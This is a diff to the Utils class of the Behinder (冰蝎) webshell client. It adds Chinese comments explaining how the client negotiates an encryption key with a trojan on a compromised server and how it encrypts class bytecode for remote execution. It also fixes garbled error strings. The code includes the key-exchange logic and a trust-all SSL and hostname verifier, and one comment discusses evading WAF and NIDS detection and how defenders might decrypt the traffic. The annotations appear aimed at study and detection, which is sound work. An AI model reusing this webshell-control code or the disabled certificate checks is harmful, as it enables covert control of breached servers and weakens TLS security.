@@ -53,6 +53,15 @@ public class Utils {
         return matcher.matches() && Integer.parseInt(portTxt) >= 1 && Integer.parseInt(portTxt) <= 65535;
     }
 
+    /**
+     * 冰蝎是先请求服务端，服务端判断请求之后生成一个 128 位的随机数，并将这个 128 位的随机数写入到 session 里面，并将这个 128 位的随机数返回给客户端，但是客户端并不会使用这个 key 作为之后的通讯的 key，而是会继续重复上面过程，不断获取 key，直到满足特定条件（下面的贴出代码）之后，才会确定是最终的 key。客户端会保存这个 key 和响应报文里面的 set-cookie 的值。这个 key 就是之后客户端和服务端进行通讯的密匙。
+     *
+     * @param getUrl
+     * @param password
+     * @param requestHeaders
+     * @return
+     * @throws Exception
+     */
     public static Map<String, String> getKeyAndCookie(String getUrl, String password, Map<String, String> requestHeaders) throws Exception {
         disableSslVerification();
         Map<String, String> result = new HashMap<>();
@@ -107,16 +116,17 @@ public class Utils {
             result.put("urlWithSession", urlwithSession);
         }
 
+        //服务端的木马里面会判断发送上来的请求是否带有 pass 参数，而在 getKeyAndCookie 里，password 的值就是连接的时候的访问密码里的值，所以在连接的时候访问密码应该要填 pass，否则响应报文会返回密匙获取失败，密码错误的错误信息.
         boolean error = false;
         errorMsg = "";
         if (((HttpURLConnection) urlConnection).getResponseCode() == 500) {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
             error = true;
-            errorMsg = "��Կ��ȡʧ��,�������?";
+            errorMsg = "密钥获取失败,密码错误?";
         } else if (((HttpURLConnection) urlConnection).getResponseCode() == 404) {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
             error = true;
-            errorMsg = "ҳ�淵��404����";
+            errorMsg = "页面返回404错误";
         } else {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getInputStream());
         }
@@ -132,17 +142,19 @@ public class Utils {
         if (error) {
             throw new Exception(errorMsg);
         } else {
+            //密匙获取成功的话，会返回一个 128 位的密匙，并保存在 rawKey_1 里面。
             String rawKey_1 = sb.toString();
             String pattern = "[a-fA-F0-9]{16}";
             Pattern r = Pattern.compile(pattern);
             Matcher m = r.matcher(rawKey_1);
             if (!m.find()) {
-                throw new Exception("ҳ����ڣ������޷���ȡ��Կ!");
+                throw new Exception("页面存在，但是无法获取密钥!");
             } else {
                 int start = 0;
                 int end = 0;
                 int cycleCount = 0;
 
+                //判断得到的密匙 rawKey_1 之后，进入循环调用 getRawKey 方法，并获取 rawKey_2，并且将 rawKey_1 和 rawKey_2 进行异或操作。获取 rawKey_2 的方法和获取 rawKey_1 基本是一样的。
                 while (true) {
                     Map<String, String> KeyAndCookie = getRawKey(getUrl, password, requestHeaders);
                     String rawKey_2 = KeyAndCookie.get("key");
@@ -167,10 +179,15 @@ public class Utils {
                         }
                     }
 
+                    //上面虽然获取了 rawKey_1 以及是 rawKey_1 和 rawKey_2 异或之后的 temp 字节数组，但是实际上最终的 finalKey 其实都是使用 rawKey_2，temp 数组只是用来控制循环的结束条件。
+                    // 每一次循环，都会重新获取 rawKey_2，重新和 rawKey_1 异或生成 temp 字节数组，其中 temp 字节数组会在两个循环里面控制 start 和 end 变量的值，
+                    // 当 end-start==16 时，结束循环，并返回最新获取的 rawKey_2 作为 finalKey。
                     if (end - start == 16) {
                         result.put("cookie", KeyAndCookie.get("cookie"));
                         result.put("beginIndex", String.valueOf(start));
                         result.put("endIndex", String.valueOf(temp.length - end));
+                        //返回的 finalKey 就是循环最后一轮获取的 rawKey_2，所以 rawKey_1 和 temp 字节数组对于最终的 finalKey 来说其实并没有用到。
+                        // 我目前的一个猜测是动态控制请求服务端获取 key 的次数，不固定向服务端请求密匙的次数，以此来绕过 waf 或 nids 的一些检测特征，但是其实 waf 或者 nids 将同一个会话服务端向客户端返回的可疑的 128 位随机数保存，然后取最后一次保存的 128 位随机数作为这个会话的通讯密匙，然后解密这个会话的通讯内容，如果可以成功解密和进行 base64 解码，那么就可以判断明文内容是不是触发检测规则。
                         String finalKey = new String(Arrays.copyOfRange(rawKey_2.getBytes(), start, end));
                         result.put("key", finalKey);
                         return result;
@@ -252,11 +269,11 @@ public class Utils {
         if (((HttpURLConnection) urlConnection).getResponseCode() == 500) {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
             error = true;
-            errorMsg = "��Կ��ȡʧ��,�������?";
+            errorMsg = "密钥获取失败,密码错误?";
         } else if (((HttpURLConnection) urlConnection).getResponseCode() == 404) {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getErrorStream());
             error = true;
-            errorMsg = "ҳ�淵��404����";
+            errorMsg = "页面返回404错误";
         } else {
             isr = new InputStreamReader(((HttpURLConnection) urlConnection).getInputStream());
         }
@@ -417,7 +434,7 @@ public class Utils {
             for (reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
             }
 
-            throw new Exception("���󷵻��쳣" + sb.toString());
+            throw new Exception("请求返回异常" + sb.toString());
         }
     }
 
@@ -450,7 +467,7 @@ public class Utils {
             for (reader = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8)); (line = reader.readLine()) != null; sb = sb.append(line + "\n")) {
             }
 
-            throw new Exception("���󷵻��쳣" + sb.toString());
+            throw new Exception("请求返回异常" + sb.toString());
         }
     }
 
@@ -477,10 +494,17 @@ public class Utils {
         return result;
     }
 
+    /**
+     * getData 方法是使用 key 加密要执行的代码的 class 字节数组，并进行 base64 编码
+     */
     public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type) throws Exception {
         return getData(key, encryptType, className, params, type, null);
     }
 
+    /**
+     * getData 方法是使用 key 加密要执行的代码的 class 字节数组，并进行 base64 编码
+     *  会调用 net.rebeyond.behinder.core.Params 里面的 getParamedClass 方法，传入 BasicInfo 参数，使用 ASM 框架来动态修改 class 文件中的属性值，详细可参考 https://xz.aliyun.com/t/2744 这篇文章
+     */
     public static byte[] getData(String key, int encryptType, String className, Map<String, String> params, String type, byte[] extraData) throws Exception {
         byte[] bincls;
         byte[] encrypedBincls;
@@ -626,13 +650,16 @@ public class Utils {
     private static void disableSslVerification() {
         try {
             TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {
+                @Override
                 public X509Certificate[] getAcceptedIssuers() {
                     return null;
                 }
 
+                @Override
                 public void checkClientTrusted(X509Certificate[] certs, String authType) {
                 }
 
+                @Override
                 public void checkServerTrusted(X509Certificate[] certs, String authType) {
                 }
             }};
@@ -651,6 +678,7 @@ public class Utils {
 
             HttpsURLConnection.setDefaultSSLSocketFactory(new Utils.MySSLSocketFactory(sc.getSocketFactory(), cipherSuites.toArray(new String[0])));
             HostnameVerifier allHostsValid = new HostnameVerifier() {
+                @Override
                 public boolean verify(String hostname, SSLSession session) {
                     return true;
                 }
@@ -666,7 +694,7 @@ public class Utils {
 
     public static void showError(Control control, String errorTxt) {
         MessageBox dialog = new MessageBox(control.getShell(), 33);
-        dialog.setText("����ʧ��");
+        dialog.setText("保存失败");
         dialog.setMessage(errorTxt);
         dialog.open();
     }
@@ -676,6 +704,7 @@ public class Utils {
             super(fileManager);
         }
 
+        @Override
         public JavaFileObject getJavaFileForInput(Location location, String className, Kind kind) throws IOException {
             JavaFileObject javaFileObject = Utils.fileObjects.get(className);
             if (javaFileObject == null) {
@@ -685,6 +714,7 @@ public class Utils {
             return javaFileObject;
         }
 
+        @Override
         public JavaFileObject getJavaFileForOutput(Location location, String qualifiedClassName, Kind kind, FileObject sibling) throws IOException {
             JavaFileObject javaFileObject = new Utils.MyJavaFileObject(qualifiedClassName, kind);
             Utils.fileObjects.put(qualifiedClassName, javaFileObject);
@@ -706,6 +736,7 @@ public class Utils {
             this.source = null;
         }
 
+        @Override
         public CharSequence getCharContent(boolean ignoreEncodingErrors) {
             if (this.source == null) {
                 throw new IllegalArgumentException("source == null");
@@ -714,6 +745,7 @@ public class Utils {
             }
         }
 
+        @Override
         public OutputStream openOutputStream() throws IOException {
             this.outPutStream = new ByteArrayOutputStream();
             return this.outPutStream;
@@ -743,30 +775,37 @@ public class Utils {
             return socket;
         }
 
+        @Override
         public Socket createSocket(Socket s, String host, int port, boolean autoClose) throws IOException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(s, host, port, autoClose));
         }
 
+        @Override
         public String[] getDefaultCipherSuites() {
             return this.sf.getDefaultCipherSuites();
         }
 
+        @Override
         public String[] getSupportedCipherSuites() {
             return this.enabledCiphers == null ? this.sf.getSupportedCipherSuites() : this.enabledCiphers;
         }
 
+        @Override
         public Socket createSocket(String host, int port) throws IOException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port));
         }
 
+        @Override
         public Socket createSocket(InetAddress address, int port) throws IOException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port));
         }
 
+        @Override
         public Socket createSocket(String host, int port, InetAddress localAddress, int localPort) throws IOException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(host, port, localAddress, localPort));
         }
 
+        @Override
         public Socket createSocket(InetAddress address, int port, InetAddress localaddress, int localport) throws IOException {
             return this.getSocketWithEnabledCiphers(this.sf.createSocket(address, port, localaddress, localport));
         }
